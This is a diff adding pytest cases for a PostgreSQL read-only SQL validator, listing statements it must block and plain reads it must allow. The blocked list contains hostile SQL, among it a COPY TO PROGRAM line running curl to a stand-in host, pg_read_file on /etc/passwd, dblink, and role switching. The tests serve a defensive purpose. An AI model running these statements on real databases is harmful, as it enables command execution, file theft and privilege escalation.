@@ -55,6 +55,41 @@ class TestValidateReadOnly:
         with pytest.raises(ValueError):
             _validate_read_only("SELECT 1; DELETE FROM users WHERE id = 1")
 
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "SELECT * INTO stolen FROM users",
+            "COPY users TO PROGRAM 'curl https://example.invalid'",
+            "SET ROLE postgres",
+            "VACUUM FULL",
+            "SELECT pg_terminate_backend(1)",
+            "SELECT pg_read_file('/etc/passwd')",
+            "SELECT * FROM dblink('host=x', 'SELECT 1') AS t(a int)",
+            "SELECT set_config('search_path', 'evil', false)",
+            "SELECT query_to_xml('DELETE FROM users', true, true, '')",
+            "SELECT * FROM users FOR UPDATE",
+            "EXPLAIN ANALYZE DELETE FROM users",
+            "EXPLAIN (ANALYZE) SELECT 1",
+            "EXPLAIN DELETE FROM users",
+            "",
+        ],
+    )
+    def test_blocks_non_read_statements(self, sql):
+        with pytest.raises(ValueError, match="Read-only mode"):
+            _validate_read_only(sql)
+
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "SELECT 1 UNION SELECT 2",
+            "EXPLAIN (FORMAT JSON) SELECT * FROM orders",
+            "SELECT count(*), max(id), now() FROM users",
+            "SELECT id FROM docs ORDER BY embedding <=> '[1,2,3]'::vector LIMIT 5",
+        ],
+    )
+    def test_allows_plain_reads(self, sql):
+        _validate_read_only(sql)
+
 
 # ---------------------------------------------------------------------------
 # Unit tests: PostgresClient.execute() blocked in read-only mode
